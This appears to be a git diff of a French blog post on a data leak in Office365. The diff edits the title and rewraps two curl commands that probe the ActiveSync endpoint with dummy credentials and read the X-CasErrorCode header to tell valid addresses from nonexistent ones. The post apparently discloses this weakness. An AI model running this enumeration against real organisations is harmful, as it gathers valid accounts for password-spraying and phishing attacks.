@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Office365 / Fuite de données : Enumération d'adresses mail valides
+title: Office365 / Fuite de données - Enumération d'adresses mail valides
 tags: [Office365 Sécurité Cloud]
 ---
 
@@ -17,13 +17,21 @@ L'url Activesync https://outlook.office365.com/Microsoft-Server-ActiveSync ne se
 **Adresse e-mail valide (prenom.nom@mondomaine.fr)**
 
 ```bash
-$ auth=$(echo -n 'prenom.nom@mondomaine.fr:motdepassebidon' | base64); curl -v -X OPTIONS -H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" -H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" -H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync 2>&1 | grep "X-CasErrorCode"
+$ auth=$(echo -n 'prenom.nom@mondomaine.fr:motdepassebidon' | base64); curl -v -X OPTIONS \
+-H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" \
+-H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" \
+-H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync \
+2>&1 | grep "X-CasErrorCode"
 <pas de retour>
 ```
 
 **Adresse e-mail inexistante (prenom.nom.bidon@mondomaine.fr)**
 
 ```bash
-$ auth=$(echo -n 'prenom.nom.bidon@mondomaine.fr:motdepassebidon' | base64); curl -v -X OPTIONS -H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" -H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" -H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync 2>&1 | grep "X-CasErrorCode"
+$ auth=$(echo -n 'prenom.nom.bidon@mondomaine.fr:motdepassebidon' | base64); curl -v \
+-X OPTIONS -H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" \
+-H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" \
+-H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync \
+2>&1 | grep "X-CasErrorCode"
 < X-CasErrorCode: UserNotFound
 ```
